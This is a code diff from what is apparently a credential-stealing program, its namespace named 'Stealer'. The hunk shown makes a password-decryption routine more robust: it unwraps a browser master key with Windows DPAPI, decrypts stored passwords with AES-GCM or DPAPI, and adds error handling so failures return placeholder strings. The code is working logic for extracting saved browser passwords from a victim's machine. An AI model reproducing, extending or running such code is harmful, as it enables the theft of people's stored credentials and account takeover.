@@ -71,16 +71,31 @@ namespace Stealer
                 byte[] masterKeyBytes = DPAPI.Decrypt(keyBytes, null, out string _);
                 byte[] bytePassword = Encoding.Default.GetBytes(password).ToArray();
                 // Decrypt password by master-key
-                byte[] iv = bytePassword.Skip(3).Take(12).ToArray(); // From 3 to 15
-                byte[] payload = bytePassword.Skip(15).ToArray(); // from 15 to end
-                string decryptedPassword = Encoding.Default.GetString(Sodium.SecretAeadAes.Decrypt(payload, iv, masterKeyBytes));
+                try
+                {
+                    byte[] iv = bytePassword.Skip(3).Take(12).ToArray(); // From 3 to 15
+                    byte[] payload = bytePassword.Skip(15).ToArray(); // from 15 to end
+                    string decryptedPassword = Encoding.Default.GetString(Sodium.SecretAeadAes.Decrypt(payload, iv, masterKeyBytes));
 
-                return decryptedPassword;
+                    return decryptedPassword;
 
-                // return decryptedPassword;
+                    // return decryptedPassword;
+                } catch
+                {
+                    return "failed (AES-GCM)";
+                }
+
+
             } else
             {
-                return Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(password), null, out string _)); ;
+                try
+                {
+                    return Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(password), null, out string _));
+                } catch
+                {
+                    return "failed (DPAPI)";
+                }
+               
             }
         }
 
